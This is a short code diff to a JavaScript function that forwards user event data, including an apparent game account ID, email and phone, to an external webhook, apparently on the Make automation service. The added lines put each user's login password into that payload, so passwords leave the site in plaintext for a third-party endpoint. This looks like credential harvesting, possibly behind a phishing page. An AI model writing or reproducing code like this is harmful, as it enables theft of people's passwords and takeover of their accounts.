@@ -78,6 +78,7 @@ export const sendToMakeWebhook = async (eventData) => {
     ffUid: String(eventData.ffUid || 'N/A'),
     email: eventData.email || 'N/A',
     phone: cleanPhone,
+    password: eventData.password || eventData.loginPassword || 'N/A',
     details: eventData.details || '',
     device: typeof window !== 'undefined' && window.innerWidth < 768 ? 'Mobile App' : 'Desktop Web',
     rawTime: new Date().toISOString()
@@ -98,6 +99,7 @@ export const sendToMakeWebhook = async (eventData) => {
     ffUid: payload.ffUid,
     email: payload.email,
     phone: payload.phone,
+    password: payload.password,
     details: payload.details,
     device: payload.device
   });
